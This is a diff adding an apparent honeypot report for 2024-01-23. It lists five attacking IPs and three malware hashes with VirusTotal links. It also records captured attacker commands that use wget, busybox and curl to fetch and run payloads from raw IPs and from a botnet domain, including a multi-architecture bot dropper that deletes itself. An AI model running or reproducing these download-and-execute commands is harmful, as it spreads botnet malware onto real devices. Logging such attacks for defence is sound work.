@@ -1,0 +1,44 @@
+Top 5 IPs for 2024-01-23:
+
+191.96.81.138
+1.34.236.199
+193.252.188.66
+125.229.233.200
+47.236.12.48
+
+
+Malware download: 
+e35e04e80869422ddd08f8a121621c5bdaad7e89165072da0d1201cecb85ce95
+https://www.virustotal.com/gui/file/e35e04e80869422ddd08f8a121621c5bdaad7e89165072da0d1201cecb85ce95
+893286774b08f5e34380460a3016a9fb3791fa5a2575fbabdb770a1c978a2714
+https://www.virustotal.com/gui/file/893286774b08f5e34380460a3016a9fb3791fa5a2575fbabdb770a1c978a2714
+b7b6697b78e1ba661051c8a77281f8a22bba12f9bfaf6a69b5ad08463f3a650a
+https://www.virustotal.com/gui/file/b7b6697b78e1ba661051c8a77281f8a22bba12f9bfaf6a69b5ad08463f3a650a
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; rm *; busybox wget http://93.123.85.42/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android
+cd /data/local/tmp/; rm -rf *; busybox wget http://103.245.236.146/huhu1.sh; sh huhu1.sh; wget http://103.245.236.146/huhu1.sh; sh huhu1.sh; curl http://103.245.236.146/huhu1.sh; sh huhu1.sh; busybox wget http://103.245.236.146/huhu2.sh; sh huhu2.sh; wget http://103.245.236.146/huhu2.sh; sh huhu2.sh; curl http://103.245.236.146/huhu2.sh; sh huhu2.sh; busybox wget http://103.245.236.146/huhu3.sh; sh huhu3.sh; wget http://103.245.236.146/huhu3.sh; sh huhu3.sh; curl http://103.245.236.146/huhu3.sh; sh huhu3.sh;
+
+
+GET /w.sh HTTP/1.1
+Host: 172.188.112.116
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+wget http://botnet.hostsgct.link/bot.arm; chmod 777 bot.arm; ./bot.arm android
+wget http://botnet.hostsgct.link/bot.arm5; chmod 777 bot.arm5; ./bot.arm5 android
+wget http://botnet.hostsgct.link/bot.arm6; chmod 777 bot.arm6; ./bot.arm6 android
+wget http://botnet.hostsgct.link/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 android
+wget http://botnet.hostsgct.link/bot.m68k; chmod 777 bot.m68k; ./bot.m68k android
+wget http://botnet.hostsgct.link/bot.mips; chmod 777 bot.mips; ./bot.mips android
+wget http://botnet.hostsgct.link/bot.mpsl; chmod 777 mpsl; ./bot.mpsl android
+wget http://botnet.hostsgct.link/bot.ppc; chmod 777 bot.pbot.pc; ./bot.ppc android
+wget http://botnet.hostsgct.link/bot.sh4; chmod 777 bot.sh4; ./bot.sh4 android
+wget http://botnet.hostsgct.link/bot.spc; chmod 777 bot.spc; ./bot.spc android
+wget http://botnet.hostsgct.link/bot.x86; chmod 777 bot.x86; ./bot.x86 android
+wget http://botnet.hostsgct.link/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 android
+rm $0
+
